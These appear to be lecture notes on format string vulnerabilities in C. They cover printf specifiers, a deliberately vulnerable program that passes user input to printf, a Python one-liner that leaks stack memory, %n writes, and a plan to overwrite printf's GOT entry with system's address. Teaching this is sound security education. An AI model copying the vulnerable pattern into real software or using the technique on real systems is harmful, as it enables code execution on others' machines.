#Format Strings

What is a format string? String with conversion specifiers.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv[])
{
	char *format = "%s";
	char *arg1 = "Hello World!\n";
	printf(format, arg1);
	return 0;
}
```

##Common formats

Char | Type | Usage
-----|------|-------
d    | 4-byte | Integer
u    | 4-byte | Unsigned Integer
x    | 4-byte | Hex
s    | 4-byte ptr | String
c    | 1-byte | Character

##The length modifier

Char | Type | Usage
-----|------|-------
hh   | 1-byte | char
h    | 2-byte | short int
l    | 4-byte | long int
ll   | 8-byte | long long int

Example: `%hd`

Common uses:

  * Formatting output
  * Counting bytes written

```c
printf("%s%n", "01234", &n);
n = 5
```

#Mistakes

User controlled format string

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	char buf[100];
	fgets(buf, 100, stdin);
	printf(buf);
	return 0;
}
```

What could possibly go wrong?

#Reading data

```sh
$ python -c 'print("AAAA"+"%08x."*10)' | ./a.out
AAAA00000064.f76f8580.f7742be8.f7741ce0.fff4aedc.000000e0.41414141.78383025.3830252e.30252e78.
```

The most important parts are `AAAA` and `41414141`. Here `41414141` 
because it's now the beginning of `char buf[100]` which is 
on the stack.

```c
printf("%x%x%x...")
```

* Only gets you so far
* Have to go through **buffer** since it's on the stack
* **Limited** input size

##Direct Parameter Access

Syntax:

```c
printf("%<arg#>$<format>");
```

Examples

```c
printf("%3$d",1,2,3);
3
printf("%3$d %2$d %1$d",1,2,3);
3 2 1
```

#Writing data

Our buddy `%n`

  * Takes a **pointer** as an argument
  * *Writes* the number of bytes written so far

#Controlled writes

My shellcode is at `0xdeadbeef`, the buffer isn't that big!

How do I count that many characters?! 

`%YYYx` Specify **width**, characters count!

e.g. `%8x` prints 8 characters

`%08x` pads with `0` instead of `<space>`

#Gaining control

Things to look for

  * Return address
  * Function pointers
  * Global Offset Table (GOT)
  * Destructor List (DTOR)

Return address and Function pointers are **Stack based**, and 
Global Offset Table (GOT) and Destructor List (DTOR) are **Binary 
based**

#Global offset table

What is it? It is the **List of pointers** to dynamically linked 
symbols: `printf`,`exit`,`system`, etc.

**fmt_lec04.c**

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
  char buf[100];

  fgets(buf, 100, stdin);
  printf(buf);
  fgets(buf, 100, stdin);
  printf(buf);

 return EXIT_SUCCESS;
}
```

```
$ readelf --relocs ./fmt_lec04

Relocation section '.rel.dyn' at offset 0x4e8 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
0804a028  00000f05 R_386_COPY        0804a028   stdin@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x4f8 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000307 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a018  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a01c  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

Let's change where `printf()` goes

```
gdb -q ./fmt_lec04
(gdb) x/i system
   0xf7e43b40 <system>: sub    esp,0xc
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e43b40 <system>
```

Let's write `0xf7e43b40` (`system`) at `0x0804a00c` GOT(`printf`)
and have fun :)





